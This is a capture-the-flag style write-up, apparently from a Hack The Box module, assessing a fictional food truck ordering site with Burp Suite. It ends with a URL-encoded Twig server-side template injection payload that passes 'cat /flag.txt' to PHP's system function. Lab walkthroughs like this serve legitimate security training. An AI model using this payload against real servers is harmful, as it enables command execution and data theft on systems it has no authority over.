# Server-Side Attack Assessment

## Scenario

`The food truck company Flavor Fusion Express tasked you to perform a security assessment of its newly launched website, 
created to enhance customer outreach and streamline online ordering. While the site aims to improve user engagement and brand presence, 
the company is particularly concerned about potential server-side vulnerabilities that could compromise sensitive business data, order information, or administrative functionality. 
Your task is to evaluate the backend infrastructure, configuration, and server logic for weaknesses that an attacker could exploit.
Try to utilize the various techniques you learned in this module to identify and exploit vulnerabilities found in the web application.`

## Task

<img width="1915" height="531" alt="image" src="https://github.com/user-attachments/assets/e6b980d9-707c-4169-9531-cf951d39275b" />

Using BURP:

Intercept the request and send it to repeater: 

<img width="1912" height="853" alt="image" src="https://github.com/user-attachments/assets/89c56075-5bdc-49aa-b922-b507e8bc4cab" />

<img width="1901" height="760" alt="image" src="https://github.com/user-attachments/assets/eeb2cfd4-0d57-449d-a30c-6d47ebf7845a" />

Explanation: 

The web page includes some inline JavaScript that automatically tries to get the locations of three trucks: "FusionExpress01", "FusionExpress02", and "FusionExpress03". It does this by looping through each truck ID and making a synchronous POST request to the server's root URL ('/').

Each request is handled using an XMLHttpRequest object, which is a JavaScript method for sending HTTP requests and handling responses from the server.

The server is expected to reply with the truck's current location in JSON format. Once the response is received, the script updates the HTML element for each truck (based on the ID) with either the location info or an error message if the request fails.

Return to origina proxy capture and forward the request:

<img width="890" height="790" alt="image" src="https://github.com/user-attachments/assets/025b039b-4493-4770-ba51-0d93a0553346" />

Send this request to Repeater as well, and then forward it to evaluate the response:

<img width="1915" height="782" alt="image" src="https://github.com/user-attachments/assets/b622bef5-5e95-4358-8e34-3b2ddd2a974c" />

```
{"id": "FusionExpress01", "location": "321 Maple Lane"}
```

Test for possible server-side template injection vulnerabilities:

<img width="803" height="458" alt="image" src="https://github.com/user-attachments/assets/0904c3c0-9bc7-4c10-87e8-2e5d3ce69250" />
<img width="1910" height="706" alt="image" src="https://github.com/user-attachments/assets/b2c9a9f3-630b-4923-a4fe-a6a8325b6738" />

The template is going to be Twig. Use the PHP built-in function system and pass an argument to it via Twig's filter function, ultimately reading the contents of the flag:

`api=http://truckapi.htb/?id%3D{{%2b['cat%2b/flag.txt']%2b%7C%2bfilter('system')%2b}}`

<img width="1910" height="704" alt="image" src="https://github.com/user-attachments/assets/e75cb1ca-d484-4162-8d7f-1c698bf1dc31" />





